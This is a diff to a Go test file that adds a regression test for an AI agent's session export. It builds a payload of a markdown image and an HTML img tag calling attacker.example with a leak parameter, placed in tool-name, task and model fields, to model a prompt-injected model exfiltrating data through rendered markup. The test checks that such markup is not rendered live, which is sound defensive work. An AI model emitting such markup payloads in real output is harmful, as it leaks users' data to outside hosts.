@@ -313,6 +313,33 @@ func TestRED_RESTFactDeleteCannotRemoveSubstringEntry(t *testing.T) {
 // but the names still land in markdown headings verbatim, so inline markup
 // (a remote image, a link, raw HTML) chosen by a prompt-injected model
 // renders live in the "human-shareable" export.
+func TestRED_ExportToolNameInjectsInlineMarkup(t *testing.T) {
+	sess := &session.Session{ID: "20260101-0123456789abcdef0123456789abcdef", Task: "t"}
+	evil := `![status](https://attacker.example/px.png?d=leak)<img src=https://attacker.example/i.png>`
+	var tc session.ToolCall
+	tc.ID = "c1"
+	tc.Type = "function"
+	tc.Function.Name = evil
+	tc.Function.Arguments = "{}"
+	sess.Messages = []session.Message{
+		{Role: "user", Content: "real prompt"},
+		{Role: "assistant", ToolCalls: []session.ToolCall{tc}},
+		{Role: "tool", ToolCallID: "c1", Name: evil, Content: "r"},
+		{Role: "assistant", Content: "done"},
+	}
+	sess.Task = evil
+	sess.Model = evil
+	md := exportSessionMarkdown(sess)
+	for _, line := range strings.Split(md, "\n") {
+		if !strings.HasPrefix(line, "### tool") && !strings.HasPrefix(line, "- **Task:**") && !strings.HasPrefix(line, "- **Model:**") {
+			continue
+		}
+		if strings.Contains(line, "](https://attacker.example") || strings.Contains(line, "<img") {
+			t.Fatalf("model-chosen tool name renders as live markup in an export heading: %q", line)
+		}
+	}
+}
+
 // apiHunt1017ReviewedSkill is what the WebUI review card holds for a skill:
 // GET /api/skills?name= (source.path and sha256 are sent back on promote).
 func apiHunt1017ReviewedSkill(t *testing.T, name string) (path, sum string) {
